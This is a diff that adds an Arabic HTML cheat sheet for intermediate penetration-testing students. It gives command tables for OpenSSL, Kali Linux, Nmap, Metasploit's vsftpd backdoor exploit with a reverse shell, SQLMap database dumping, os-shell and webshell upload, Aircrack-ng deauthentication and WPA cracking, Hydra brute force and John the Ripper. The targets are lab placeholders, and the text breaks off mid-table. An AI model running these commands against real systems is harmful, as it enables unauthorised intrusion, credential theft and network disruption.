@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ـ <title>Qusay_kali</title>
+ <link rel="stylesheet" href="style.css">
+                       <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    </head>
+        <body>
+ <div class="container">
+ <header class="glowing-header">
+ <h1> Qusay_kali - (Cyber Security) </h1>
+ <div class="separator-dots"></div>
+ <p class="level-info">المستوى المتوسط / Intermediate level</p>
+ </header>
+        <section class="section-card">
+            <h2>1. الأمن السيبراني (Cybersecurity)</h2>
+            <div class="concept-box">
+                <h4>التعريف:</h4>
+                <p><strong>حماية الأنظمة، الشبكات، والبيانات</strong> من الوصول غير المصرح به، التعديل، أو التلف، مع ضمان استمرارية الأعمال الرقمية.</p>
+            </div>
+
+            <h3>الثالوث الأمني (CIA Triad):</h3>
+            <ul>
+                <li><strong>Confidentiality (السرية):</strong> حماية البيانات من الوصول غير المصرح به.</li>
+                <li><strong>Integrity (التكامل):</strong> التأكد من أن البيانات لم يتم تعديلها أو العبث بها.</li>
+                <li><strong>Availability (التوافر):</strong> ضمان وصول البيانات والخدمات عند الحاجة إليها.</li>
+            </ul>
+
+            <h3>أهم 5 مبادئ للحماية الشخصية:</h3>
+            <ol>
+                <li>تحديث النظام والبرامج بانتظام.</li>
+                <li>كلمات مرور قوية وفريدة لكل حساب.</li>
+                <li>تمكين المصادقة الثنائية (2FA).</li>
+                <li>النسخ الاحتياطي الدوري للبيانات.</li>
+                <li>المراقبة المستمرة والتوعية بالتهديدات.</li>
+            </ol>
+        </section>
+
+        <section class="section-card">
+            <h2>2. نظام Windows</h2>
+            <div class="concept-box">
+                <h4>ما هو Windows:</h4>
+                <p>نظام تشغيل من Microsoft لإدارة العتاد والبرمجيات والتطبيقات.</p>
+            </div>
+            
+            <h3>أهميته في اختبار الاختراق:</h3>
+            <ul>
+                <li>انتشار واسع بين المستخدمين والشركات، مما يجعله هدفاً شائعاً.</li>
+                <li>يحتوي على خدمات قابلة للاختبار التعليمي (SMB، RDP، IIS).</li>
+                <li>بيئة مثالية لمختبرات التدريب القانونية باستخدام الأجهزة الافتراضية.</li>
+            </ul>
+        </section>
+
+        <section class="section-card">
+            <h2>3. التشفير (Encryption)</h2>
+            <div class="concept-box">
+                <h4>المفهوم:</h4>
+                <p>تحويل البيانات من نص واضح (Plaintext) إلى نص مشفر (Ciphertext) والعكس.</p>
+            </div>
+
+            <h3>أنواع التشفير:</h3>
+            <div class="grid-3-col">
+                <div class="grid-item">
+                    <h4>متماثل (Symmetric):</h4>
+                    <p>يستخدم نفس المفتاح للتشفير وفك التشفير، مثل AES.</p>
+                </div>
+                <div class="grid-item">
+                    <h4>غير متماثل (Asymmetric):</h4>
+                    <p>يستخدم مفتاح عام للتشفير ومفتاح خاص لفك التشفير، مثل RSA.</p>
+                </div>
+            </div>
+
+            <h3>تعليمات Openssl المتقدمة (Encryption Commands):</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>الوصف</th>
+                        <th>الأمر التنفيذي</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>توليد مفتاح RSA خاص بطول 2048 بت</td><td><pre>openssl genrsa -out private.key 2048</pre></td></tr>
+                    <tr><td>استخراج المفتاح العام من الخاص</td><td><pre>openssl rsa -in private.key -pubout -out public.key</pre></td></tr>
+                    <tr><td>تشفير ملف باستخدام AES-256-CBC</td><td><pre>openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k "YourPassphrase"</pre></td></tr>
+                    <tr><td>فك تشفير الملف المشفر سابقًا</td><td><pre>openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -k "YourPassphrase"</pre></td></tr>
+                    <tr><td>توقيع رقمّي للملف باستخدام المفتاح الخاص</td><td><pre>openssl dgst -sha256 -sign private.key -out file.sig file.txt</pre></td></tr>
+                    <tr><td>التحقق من التوقيع باستخدام المفتاح العام</td><td><pre>openssl dgst -sha256 -verify public.key -signature file.sig file.txt</pre></td></tr>
+                    <tr><td>توليد طلب شهادة CSR</td><td><pre>openssl req -new -key private.key -out request.csr</pre></td></tr>
+                    <tr><td>تشفير نص باستخدام AES-128</td><td><pre>echo "SecretMessage" | openssl enc -aes-128-cbc -a -salt -pass pass:1234</pre></td></tr>
+                    <tr><td>فك تشفير نص AES-128</td><td><pre>echo "EncryptedText" | openssl enc -aes-128-cbc -d -a -pass pass:1234</pre></td></tr>
+                    <tr><td>تحويل PEM إلى DER</td><td><pre>openssl rsa -in private.key -outform DER -out private.der</pre></td></tr>
+                    <tr><td>توليد SHA256 Hash للملف</td><td><pre>openssl dgst -sha256 file.txt</pre></td></tr>
+                    <tr><td>توليد MD5 Hash للملف</td><td><pre>openssl dgst -md5 file.txt</pre></td></tr>
+                    <tr><td>تشفير ملف باستخدام DES</td><td><pre>openssl enc -des-cbc -in secret.txt -out secret.des</pre></td></tr>
+                    <tr><td>فك تشفير DES</td><td><pre>openssl enc -d -des-cbc -in secret.des -out secret.txt</pre></td></tr>
+                    <tr><td>توليد مفتاح DH</td><td><pre>openssl dhparam -out dhparam.pem 2048</pre></td></tr>
+                    <tr><td>تشفير رسالة باستخدام RSA</td><td><pre>openssl rsautl -encrypt -inkey public.key -pubin -in message.txt -out message.enc</pre></td></tr>
+                    <tr><td>فك تشفير رسالة RSA</td><td><pre>openssl rsautl -decrypt -inkey private.key -in message.enc -out message.txt</pre></td></tr>
+                    <tr><td>عرض تفاصيل شهادة X.509</td><td><pre>openssl x509 -in certificate.crt -text -noout</pre></td></tr>
+                    <tr><td>تحويل شهادة CRT إلى PEM</td><td><pre>openssl x509 -in certificate.crt -out certificate.pem -outform PEM</pre></td></tr>
+                    <tr><td>إنشاء شهادة موقعة ذاتياً</td><td><pre>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout selfsigned.key -out selfsigned.crt</pre></td></tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section class="section-card">
+            <h2>4. تحميل وإعداد كالي لينكس</h2>
+            
+            <h3>البحث والتحميل:</h3>
+            <ul>
+                <li><strong>ابحث في Google عن:</strong> Kali Linux download official</li>
+                <li><strong>اختر الموقع الرسمي:</strong> https://www.kali.org/get-kali</li>
+                <li><strong>اختر النسخة المناسبة:</strong> ISO Installer (64-bit) للتثبيت الكامل، أو VirtualBox / VMware Image للتشغيل السريع في جهاز افتراضي.</li>
+                <li>حمّل النسخة الرسمية.</li>
+            </ul>
+
+            <h3>إعداد الجهاز الافتراضي (VirtualBox VM):</h3>
+            <ol>
+                <li>امنح الجهاز اسماً (مثل Kali) وحدد النوع Linux والنسخة Debian (64-bit).</li>
+                <li>حدد الذاكرة: 2048 ميجابايت فما فوق.</li>
+                <li>اختر القرص الصلب الافتراضي: VDI, Dynamically allocated, 20 GB+.</li>
+                <li>ابدأ تشغيل الجهاز واختر ملف ISO الذي حملته.</li>
+            </ol>
+
+            <h3>التثبيت:</h3>
+            <ol>
+                <li>اختر Graphical Install.</li>
+                <li>اختر اللغة، المنطقة، لوحة المفاتيح.</li>
+                <li>أعد إعداد الشبكة واسم المضيف.</li>
+                <li>اختيار القرص: Use Entire Disk.</li>
+                <li>أنشئ مستخدم عادي (أو مستخدم Root حسب الحاجة التدريبية).</li>
+                <li>الانتهاء وإعادة التشغيل.</li>
+            </ol>
+        </section>
+
+        <section class="section-card">
+            <h2>5. أساسيات أوامر Terminal في كالي لينكس</h2>
+            <h3>تعليمات Terminal الأساسية والمتقدمة:</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>الوصف</th>
+                        <th>الأمر التنفيذي</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>تحديث النظام والبرامج</td><td><pre>sudo apt update && sudo apt upgrade -y</pre></td></tr>
+                    <tr><td>الانتقال إلى مجلد Desktop</td><td><pre>cd /home/kali/Desktop</pre></td></tr>
+                    <tr><td>عرض جميع الملفات والمجلدات بالتفاصيل</td><td><pre>ls -la</pre></td></tr>
+                    <tr><td>إعادة تسمية أو نقل ملف</td><td><pre>mv old.txt new.txt</pre></td></tr>
+                    <tr><td>نسخ ملف إلى مجلد آخر</td><td><pre>cp file.txt /tmp/</pre></td></tr>
+                    <tr><td>حذف ملف</td><td><pre>rm unwanted.txt</pre></td></tr>
+                    <tr><td>إنشاء مجلد جديد</td><td><pre>mkdir lab</pre></td></tr>
+                    <tr><td>حذف مجلد فارغ</td><td><pre>rmdir emptydir</pre></td></tr>
+                    <tr><td>عرض المسار الحالي</td><td><pre>pwd</pre></td></tr>
+                    <tr><td>فتح دليل المستخدم (Manual) لنصف Nmap</td><td><pre>man nmap</pre></td></tr>
+                    <tr><td>عرض المساعدة للأمر cd</td><td><pre>help cd</pre></td></tr>
+                    <tr><td>عرض محتوى ملف Hosts</td><td><pre>cat /etc/hosts</pre></td></tr>
+                    <tr><td>البحث عن كلمة "password" داخل ملف السجلات</td><td><pre>grep -i "password" /var/log/syslog</pre></td></tr>
+                    <tr><td>إنشاء ملف وكتابة نص بداخله</td><td><pre>echo "hello world" > hello.txt</pre></td></tr>
+                    <tr><td>متابعة آخر الأسطر في الملف بشكل حي</td><td><pre>tail -f /var/log/auth.log</pre></td></tr>
+                    <tr><td>عرض أول 20 سطر من الملف</td><td><pre>head -n 20 bigfile.log</pre></td></tr>
+                    <tr><td>تصفح الملف بالتدرج</td><td><pre>less largefile.log</pre></td></tr>
+                    <tr><td>تصفح الملف بطريقة أبسط من less</td><td><pre>more largefile.log</pre></td></tr>
+                    <tr><td>فتح محرر Nano لتحرير الملف</td><td><pre>nano notes.txt</pre></td></tr>
+                    <tr><td>عرض عناوين الشبكة</td><td><pre>ip a</pre></td></tr>
+                    <tr><td>اختبار الاتصال بعنوان الهدف</td><td><pre>ping -c 4 &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>عرض المنافذ والاتصالات النشطة</td><td><pre>netstat -tulnp</pre></td></tr>
+                    <tr><td>الاتصال عبر SSH بهدف محدد</td><td><pre>ssh user@&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>نسخ ملف عبر SSH إلى الهدف</td><td><pre>scp file.txt user@&lt;TARGET_IP&gt;:/home/user/</pre></td></tr>
+                    <tr><td>تغيير أذونات الملف</td><td><pre>chmod 644 file.txt</pre></td></tr>
+                    <tr><td>تغيير مالك الملف</td><td><pre>sudo chown user:user file.txt</pre></td></tr>
+                    <tr><td>عرض العمليات الجارية بشكل حي</td><td><pre>top</pre></td></tr>
+                    <tr><td>البحث عن عملية SSHD</td><td><pre>ps aux | grep sshd</pre></td></tr>
+                    <tr><td>إنهاء عملية بواسطة PID</td><td><pre>kill 1234</pre></td></tr>
+                    <tr><td>مسح شاشة الطرفية</td><td><pre>clear</pre></td></tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section class="section-card">
+            <h2>6. أدوات Kali Linux المتقدمة (مع الأمثلة التنفيذية)</h2>
+
+            <h3>1. Nmap (Network Mapper) - أداة فحص الشبكات</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فحص المنافذ المفتوحة على الهدف</td><td><pre>nmap &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>فحص منفذ SSH فقط على الهدف</td><td><pre>nmap -p 22 &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>فحص منافذ HTTP و HTTPS على الهدف</td><td><pre>nmap -p 80,443 &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>مسح جميع المنافذ من 1 إلى 65535 على الهدف</td><td><pre>nmap -p- &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>كشف نسخ الخدمات على المنافذ المفتوحة للهدف</td><td><pre>nmap -sV &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>كشف نظام التشغيل + الخدمات + سكربتات إضافية على الهدف</td><td><pre>nmap -A &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>كشف نظام التشغيل على الهدف</td><td><pre>nmap -O &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>TCP SYN Scan على الهدف</td><td><pre>nmap -sS &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>تشغيل السكربتات الافتراضية لفحص الثغرات على الهدف</td><td><pre>nmap -sC &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>مسح سريع باستخدام توقيت T4</td><td><pre>nmap -T4 &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>عرض التفاصيل أثناء المسح (Verbose)</td><td><pre>nmap -v &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>تجاهل فحص Ping وإجبار الفحص للهدف</td><td><pre>nmap -Pn &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>فحص IPv6 للهدف</td><td><pre>nmap -6 &lt;TARGET_IPV6&gt;</pre></td></tr>
+                    <tr><td>كشف الثغرات باستخدام سكربتات Nmap على الهدف</td><td><pre>nmap --script=vuln &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>استخراج عنوان صفحة الويب على المنفذ 80 للهدف</td><td><pre>nmap --script=http-title &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>حفظ النتائج في ملف نصي</td><td><pre>nmap -oN output.txt &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>حفظ النتائج بصيغة XML</td><td><pre>nmap -oX output.xml &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>حفظ النتائج بصيغة grepable</td><td><pre>nmap -oG output.gnmap &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>مسح المنافذ من 1 إلى 1024 فقط على الهدف</td><td><pre>nmap -p 1-1024 &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>عرض المنافذ المفتوحة فقط للهدف</td><td><pre>nmap --open &lt;TARGET_IP&gt;</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>2. Metasploit Framework - إطار عمل الاستغلال</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فتح واجهة Metasploit</td><td><pre>msfconsole</pre></td></tr>
+                    <tr><td>البحث عن Exploit مرتبط بخدمة vsftpd</td><td><pre>search vsftpd</pre></td></tr>
+                    <tr><td>اختيار Exploit محدد</td><td><pre>use exploit/unix/ftp/vsftpd_234_backdoor</pre></td></tr>
+                    <tr><td>عرض الخيارات المطلوبة للاستغلال</td><td><pre>show options</pre></td></tr>
+                    <tr><td>تعيين عنوان الهدف</td><td><pre>set RHOST &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>تعيين عنوان المهاجم (جهازك)</td><td><pre>set LHOST &lt;LHOST&gt;</pre></td></tr>
+                    <tr><td>اختيار Payload مناسب</td><td><pre>set PAYLOAD cmd/unix/reverse_bash</pre></td></tr>
+                    <tr><td>تنفيذ الاستغلال على الهدف</td><td><pre>exploit</pre></td></tr>
+                    <tr><td>عرض الجلسات النشطة بعد الاستغلال</td><td><pre>sessions -l</pre></td></tr>
+                    <tr><td>الدخول إلى الجلسة رقم 1</td><td><pre>sessions -i 1</pre></td></tr>
+                    <tr><td>إرسال الجلسة إلى الخلفية</td><td><pre>background</pre></td></tr>
+                    <tr><td>عرض الوظائف الجارية في الخلفية</td><td><pre>jobs</pre></td></tr>
+                    <tr><td>عرض معلومات عن Exploit محدد</td><td><pre>info exploit/unix/ftp/vsftpd_234_backdoor</pre></td></tr>
+                    <tr><td>التحقق من إمكانية استغلال الهدف</td><td><pre>check</pre></td></tr>
+                    <tr><td>إزالة وحدة معينة من Metasploit</td><td><pre>unload</pre></td></tr>
+                    <tr><td>حفظ الإعدادات الحالية</td><td><pre>save</pre></td></tr>
+                    <tr><td>إضافة مسار شبكة للهدف</td><td><pre>route add &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>تحميل Modules إضافية</td><td><pre>loadpath /path/to/modules</pre></td></tr>
+                    <tr><td>التحقق من حالة قاعدة البيانات</td><td><pre>db_status</pre></td></tr>
+                    <tr><td>استخدام Nmap من داخل Metasploit على الهدف</td><td><pre>db_nmap &lt;TARGET_IP&gt;</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>3. Burp Suite Community Edition - فحص تطبيقات الويب</h3>
+            <table>
+                <thead>
+                    <tr><th>الخطوة / الوصف</th><th>التوضيح</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فتح Burp Suite CE</td><td><pre>فتح الأداة في Kali Linux</pre></td></tr>
+                    <tr><td>تمكين اعتراض الطلبات</td><td><pre>Proxy → Intercept On</pre></td></tr>
+                    <tr><td>توجيه المتصفح لتمرير الطلبات عبر Burp</td><td><pre>إعداد المتصفح → 127.0.0.1:8080</pre></td></tr>
+                    <tr><td>تصفح موقع اختبار على الهدف</td><td><pre>فتح http://&lt;TARGET_HOST&gt;/DVWA</pre></td></tr>
+                    <tr><td>اعتراض الطلب</td><td><pre>اعتراض أي طلب HTTP مرسل من المتصفح إلى الهدف</pre></td></tr>
+                    <tr><td>اختبار إدخال نصوص SQL بشكل قانوني على هدف اختبار</td><td><pre>تعديل parameter id=1 → id=1' OR '1'='1</pre></td></tr>
+                    <tr><td>إرسال الطلب إلى Repeater لتعديله وتجربته</td><td><pre>Send to Repeater</pre></td></tr>
+                    <tr><td>تجربة إدخال Payload على الموقع الهدف</td><td><pre>Repeater → تعديل payload → Go</pre></td></tr>
+                    <tr><td>حفظ الطلب في ملف</td><td><pre>Export request → request.txt</pre></td></tr>
+                    <tr><td>تعيين مواضع الهجوم</td><td><pre>Intruder → Positions → Attack type</pre></td></tr>
+                    <tr><td>تنفيذ الهجوم التعليمي على الهدف</td><td><pre>Intruder → Payloads → Start attack</pre></td></tr>
+                    <tr><td>عرض جميع الطلبات والردود</td><td><pre>Proxy → HTTP history</pre></td></tr>
+                    <tr><td>تعديل البيانات النصية وترميزها</td><td><pre>Decoder → ترميز وفك الترميز</pre></td></tr>
+                    <tr><td>مقارنة الفرق بين ردود الخادم</td><td><pre>Comparer → مقارنة الاستجابات</pre></td></tr>
+                    <tr><td>تحليل العشوائية لرموز الجلسات</td><td><pre>Sequencer → تحليل randomness</pre></td></tr>
+                    <tr><td>مسح صفحات الموقع الهدف القانوني</td><td><pre>Spider → فحص جميع الروابط</pre></td></tr>
+                    <tr><td>عرض خريطة الموقع الهدف</td><td><pre>Target → Site map</pre></td></tr>
+                    <tr><td>تثبيت إضافات لتوسيع الوظائف</td><td><pre>Extender → تحميل إضافات</pre></td></tr>
+                    <tr><td>متابعة جميع الطلبات والردود</td><td><pre>Logger → مراقبة حركة المرور</pre></td></tr>
+                    <tr><td>تعديل منفذ التشغيل</td><td><pre>Options → تغيير Port</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>4. SQLMap - الاستغلال التلقائي لـ SQL Injection</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>كشف قواعد البيانات على هدف الاختبار (DVWA)</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs</pre></td></tr>
+                    <tr><td>فحص مدخل محدد لحقن SQL على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" -p id --dbs</pre></td></tr>
+                    <tr><td>عرض جداول قاعدة بيانات dvwa على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" -D dvwa --tables</pre></td></tr>
+                    <tr><td>كشف أعمدة جدول users على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" -D dvwa -T users --columns</pre></td></tr>
+                    <tr><td>استخراج بيانات من الجدول على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" -D dvwa -T users -C username,password --dump</pre></td></tr>
+                    <tr><td>تشغيل SQLMap باستخدام طلب محفوظ (مرّر عبر بروكسي محلي)</td><td><pre>sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --dbs</pre></td></tr>
+                    <tr><td>استخدام تقنية Union Injection تلقائيًا</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --technique=U --batch</pre></td></tr>
+                    <tr><td>تعيين مستوى الخطر والدقة</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --risk=3 --level=5</pre></td></tr>
+                    <tr><td>زيادة سرعة الفحص بعدة خيوط</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --threads=5</pre></td></tr>
+                    <tr><td>استخراج Banner قاعدة البيانات على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --banner</pre></td></tr>
+                    <tr><td>معرفة المستخدم الحالي للقاعدة على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --current-user</pre></td></tr>
+                    <tr><td>معرفة قاعدة البيانات الحالية على الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --current-db</pre></td></tr>
+                    <tr><td>استخراج كلمات المرور المشفرة (محليًا) من الهدف التعليمي</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --passwords</pre></td></tr>
+                    <tr><td>فتح Terminal على النظام المحلي التعليمي في الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --os-shell</pre></td></tr>
+                    <tr><td>قراءة ملفات النظام محليًا من الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --file-read=/etc/passwd</pre></td></tr>
+                    <tr><td>إنشاء ملف وهمي على هدف الاختبار</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --file-write=evil.php --file-dest=/var/www/html/evil.php</pre></td></tr>
+                    <tr><td>تجربة استخدام Tor للتعلم (اتصال عبر شبكة تور)</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --tor --tor-type=SOCKS5</pre></td></tr>
+                    <tr><td>استخراج جميع الجداول التعليمية من الهدف</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --dump-all</pre></td></tr>
+                    <tr><td>تعيين أعلى مستوى فحص للحقن</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --level=5</pre></td></tr>
+                    <tr><td>تعيين مستوى الخطر للاختبارات</td><td><pre>sqlmap -u "http://&lt;TARGET_HOST&gt;/test.php?id=1" --risk=3</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>5. Aircrack-ng - اختبار الشبكات اللاسلكية</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>تمكين وضع المراقبة على بطاقة الواي فاي</td><td><pre>sudo airmon-ng start &lt;INTERFACE&gt;</pre></td></tr>
+                    <tr><td>مراقبة الشبكات القريبة</td><td><pre>sudo airodump-ng &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>حفظ الحزم لشبكة معينة</td><td><pre>sudo airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w capture &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>إرسال حزم قطع الاتصال بشكل قانوني (على شبكة وهمية للتدريب)</td><td><pre>sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>تجربة كسر كلمة مرور Wi-Fi تجريبية</td><td><pre>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID&gt; capture-01.cap</pre></td></tr>
+                    <tr><td>إيقاف الخدمات التي تعيق المراقبة</td><td><pre>sudo airmon-ng check kill</pre></td></tr>
+                    <tr><td>فك تشفير الحزم المسجلة</td><td><pre>airdecap-ng -e &lt;ESSID&gt; -p &lt;password&gt; capture-01.cap</pre></td></tr>
+                    <tr><td>إيقاف وضع المراقبة</td><td><pre>sudo airmon-ng stop &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>ضبط البطاقة على وضع المراقبة</td><td><pre>sudo iwconfig &lt;INTERFACE&gt; mode monitor</pre></td></tr>
+                    <tr><td>تعيين القناة</td><td><pre>sudo iwconfig &lt;INTERFACE&gt; channel 6</pre></td></tr>
+                    <tr><td>حفظ الحزم الملتقطة</td><td><pre>sudo airodump-ng --write dump &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>تنفيذ Fake Authentication على شبكة وهمية</td><td><pre>sudo aireplay-ng --fakeauth 0 -a &lt;BSSID&gt; &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>اختبار التفاعل اليدوي</td><td><pre>sudo aireplay-ng --interactive -a &lt;BSSID&gt; &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>حفظ كلمات المرور المكتشفة</td><td><pre>aircrack-ng -b &lt;BSSID&gt; capture-01.cap -l cracked.txt</pre></td></tr>
+                    <tr><td>جمع الحزم IV فقط</td><td><pre>sudo airodump-ng --ivs &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>اختبار الوظائف</td><td><pre>sudo aireplay-ng --test &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>البحث عن WPS-enabled شبكات</td><td><pre>sudo wash -i &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>تجربة WPS PIN (شبكة وهمية للتدريب)</td><td><pre>sudo reaver -i &lt;INTERFACE&gt;mon -b &lt;BSSID&gt; -vv</pre></td></tr>
+                    <tr><td>حفظ الحزم بشكل متتابع</td><td><pre>sudo airodump-ng -w capfile --write-interval 1 &lt;INTERFACE&gt;mon</pre></td></tr>
+                    <tr><td>هجوم ChopChop تعليمي</td><td><pre>sudo aireplay-ng --chopchop -b &lt;BSSID&gt; &lt;INTERFACE&gt;mon</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>6. Wireshark - تحليل الحزم</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فتح واجهة Wireshark الرسومية</td><td><pre>wireshark</pre></td></tr>
+                    <tr><td>مراقبة واجهة loopback (محلي)</td><td><pre>wireshark -i lo</pre></td></tr>
+                    <tr><td>بدء الالتقاط تلقائيًا على الواجهة المحلية</td><td><pre>wireshark -k -i lo</pre></td></tr>
+                    <tr><td>فلترة الحزم حسب عنوان IP الهدف</td><td><pre>wireshark -Y "ip.addr==&lt;TARGET_IP&gt;"</pre></td></tr>
+                    <tr><td>فلترة حزم HTTP</td><td><pre>wireshark -Y "http.request"</pre></td></tr>
+                    <tr><td>فلترة حزم DNS</td><td><pre>wireshark -Y "dns"</pre></td></tr>
+                    <tr><td>فلترة حركة SSH</td><td><pre>wireshark -Y "tcp.port==22"</pre></td></tr>
+                    <tr><td>فتح ملف pcap موجود لتحليل الحزم</td><td><pre>wireshark -r capture.pcap</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>7. Hydra - هجوم القوة الغاشمة (Brute-Force)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>اختبار قوة كلمة مرور SSH على الهدف</td><td><pre>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>اختبار FTP على الهدف</td><td><pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>اختبار Telnet مع قائمة أسماء مستخدمين على الهدف</td><td><pre>hydra -L users.txt -p 1234 telnet://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>اختبار SMTP على الهدف</td><td><pre>hydra -l user -P pass.txt smtp://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>اختبار HTTP GET على الهدف (يمكن استخدام اسم نطاق)</td><td><pre>hydra -l admin -P pass.txt http-get://&lt;TARGET_HOST&gt;</pre></td></tr>
+                    <tr><td>اختبار MySQL على الهدف</td><td><pre>hydra -L users.txt -P passwords.txt mysql://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>تجربة كلمة مرور واحدة على الهدف</td><td><pre>hydra -l root -p password ssh://&lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>استخدام 4 Threads لتسريع الاختبار</td><td><pre>hydra -t 4 -L users.txt -P passwords.txt ssh://&lt;TARGET_IP&gt;</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>8. John the Ripper - كاسر كلمات المرور (Hashes)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>كسر كلمات مرور من ملف Hash تعليمي</td><td><pre>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre></td></tr>
+                    <tr><td>تحديد نوع Hash MD5</td><td><pre>john --format=md5 hash.txt</pre></td></tr>
+                    <tr><td>تحديد نوع SHA256</td><td><pre>john --format=sha256 hash.txt</pre></td></tr>
+                    <tr><td>عرض كلمات المرور المكتشفة</td><td><pre>john --show hash.txt</pre></td></tr>
